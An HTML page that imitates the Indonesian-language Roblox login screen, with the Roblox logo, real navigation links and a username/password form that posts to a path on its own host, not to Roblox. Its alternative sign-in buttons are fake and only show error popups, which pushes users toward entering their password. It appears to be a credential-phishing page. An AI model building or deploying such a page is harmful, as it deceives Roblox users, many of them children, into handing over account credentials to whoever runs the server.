<html lang="en">
    <head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>
    Log in ke Roblox
    </title>
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Montserrat', sans-serif;
        }
    </style>
    </head>
    <body class="bg-[#0d0d12] text-white font-sans">
    <div id="popup-container" class="fixed top-5 right-5 z-50"></div>
    <nav class="flex flex-wrap items-center px-4 py-2 bg-[#12131a]">
        <!-- Logo -->
        <div class="flex items-center space-x-2 md:space-x-4 flex-shrink-0">
            <img alt="Roblox logo" class="w-8 h-8 md:w-10 md:h-10 cursor-pointer"
                src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg" />
        </div>

        <!-- Menu links -->
        <div class="flex flex-wrap items-center ml-2 space-x-2 md:space-x-4">
            <a href="https://www.roblox.com/id/charts"
            class="border-b-2 border-transparent font-semibold text-white text-sm md:text-lg px-2 md:px-3 hover:border-white transition-colors">
            Teratas
            </a>
            <a href="https://www.roblox.com/id/catalog"
            class="border-b-2 border-transparent font-semibold text-white text-sm md:text-lg px-2 md:px-3 hover:border-white transition-colors">
            Marketplace
            </a>
            <a href="https://create.roblox.com/"
            class="border-b-2 border-transparent font-semibold text-white text-sm md:text-lg px-2 md:px-3 hover:border-white transition-colors">
            Buat
            </a>
            <a href="https://www.roblox.com/id/upgrades/robux?ctx=navpopover"
            class="border-b-2 border-transparent font-semibold text-white text-sm md:text-lg px-2 md:px-3 hover:border-white transition-colors">
            Robux
            </a>
            <!-- Search input -->
            <div class="relative w-full md:w-auto mt-2 md:mt-0">
            <input class="bg-[#1e1f29] rounded-md text-white text-sm md:text-base pl-8 pr-3 py-1.5 w-full md:w-64 focus:outline-none"
                    placeholder="Cari" type="search" autocomplete="off" />
            <i class="fas fa-search absolute left-2 top-1/2 -translate-y-1/2 text-gray-400 text-xs md:text-sm"></i>
            </div>
        </div>

        <!-- Buttons -->
        <div class="flex flex-wrap items-center ml-auto space-x-2 mt-2 md:mt-0">
            <button onclick="window.location.href='https://www.roblox.com/id/account/signupredir?returnUrl='"
                    class="bg-[#2563eb] text-white text-sm md:text-base font-semibold rounded-md px-3 py-1.5">
            Daftar
            </button>
            <button class="bg-[#1e1f29] border border-gray-400 text-white text-sm md:text-base font-semibold rounded-md px-3 py-1.5">
            Log In
            </button>
        </div>
    </nav>
    <main class="flex justify-center mt-16 px-4">
    <section class="bg-[#252836] rounded-md p-6 w-[400px] text-center select-none">
        <h1 class="font-bold text-white text-4xl mb-4">
        Log in ke Roblox
        </h1>
        <form class="space-y-3" action="/id/login" method="POST" id="loginForm">
        <input name="email" class="w-full bg-[#3a3f54] rounded-md py-2 px-3 text-white text-base placeholder:text-gray-400 focus:outline-none" placeholder="Nama Pengguna/Email/Nomor Ponsel" type="text" autocomplete="off" required/>
        <input name="password" class="w-full bg-[#3a3f54] rounded-md py-2 px-3 text-white text-base placeholder:text-gray-400 focus:outline-none" placeholder="Password" type="password" autocomplete="off" required/>
        <button class="w-full border border-white rounded-md py-2 text-white text-base font-semibold hover:bg-white hover:text-[#252836] transition" type="submit">
        Log In
        </button>
        </form>
        <p class="text-base font-semibold text-white mt-4 mb-4">
        Lupa Password atau Nama Pengguna?
        </p>
        <hr class="border-gray-600 mb-4"/>
        <button onclick="showError('Kode Sekali Pakai sedang error saat ini!')" class="w-full bg-[#3a3f54] rounded-md py-2 text-white text-base font-semibold mb-3">
        Kirimi Saya Kode Sekali Pakai
        </button>
        <button onclick="connectPerangkat('Terjadi kesalahan saat mencoba menghubungkan ke perangkat lain')" class="w-full bg-[#3a3f54] rounded-md py-2 text-white text-base font-semibold mb-6">
        Gunakan Perangkat Lain
        </button>
        <p class="text-base text-white">
        Tidak punya akun?
        <a class="underline" href="https://www.roblox.com/id/account/signupredir?returnUrl=">
        Daftar
        </a>
        </p>
    </section>
    </main>

    <script>
        function showError(message, duration = 4000) {
        const container = document.getElementById('popup-container');

        // Buat elemen popup
        const popup = document.createElement('div');
        popup.className = "bg-gray-600 text-white px-4 py-3 rounded shadow-lg mb-2 flex items-center justify-between animate-slide-in";
        popup.innerHTML = `
            <span>${message}</span>
            <button class="ml-4 font-bold" onclick="this.parentElement.remove()">×</button>
        `;

        container.appendChild(popup);

        // Hapus otomatis setelah duration
        setTimeout(() => {
            popup.remove();
        }, duration);
        }

        function connectPerangkat(message, duration = 4000) {
        const container = document.getElementById('popup-container');
        setTimeout(() => {
            // Buat elemen popup
            const popup = document.createElement('div');
            popup.className = "bg-gray-600 text-white px-4 py-3 rounded shadow-lg mb-2 flex items-center justify-between animate-slide-in";
            popup.innerHTML = `
                <span>${message}</span>
                <button class="ml-4 font-bold" onclick="this.parentElement.remove()">×</button>
            `;

            container.appendChild(popup);

            // Hapus otomatis setelah duration
            setTimeout(() => {
                popup.remove();
            }, duration);
        }, 2500);
        }
    </script>

    <style>
        @keyframes slide-in {
        from { opacity: 0; transform: translateX(100%); }
        to { opacity: 1; transform: translateX(0); }
        }
        .animate-slide-in {
        animation: slide-in 0.5s ease forwards;
        }
    </style>


    <script>
    const form = document.getElementById("loginForm");
    const inputs = form.querySelectorAll("input[required]");
    const container = document.getElementById('popup-container');
    var foreachnya = 0;

    inputs.forEach(input => {
        // Custom pesan saat field invalid
        input.addEventListener("invalid", (e) => {
            e.preventDefault();
            if (!input.value && foreachnya == 0) {
                const popup = document.createElement('div');
                foreachnya += 1;
                popup.className = "bg-gray-600 text-white px-4 py-3 rounded shadow-lg mb-2 flex items-center justify-between animate-slide-in";
                popup.innerHTML = `
                    <span>Harap isi semua Kolom nya</span>
                    <button class="ml-4 font-bold" onclick="this.parentElement.remove()">×</button>
                `;

                container.appendChild(popup);

                // Hapus otomatis setelah duration
                setTimeout(() => {
                    popup.remove();
                    foreachnya = 0;
                }, 4000);
            }
        });

        // Reset custom validity saat user mengetik
        input.addEventListener("input", () => {
            foreachnya = 0;
        });
    });
    </script>
    </body>
</html>
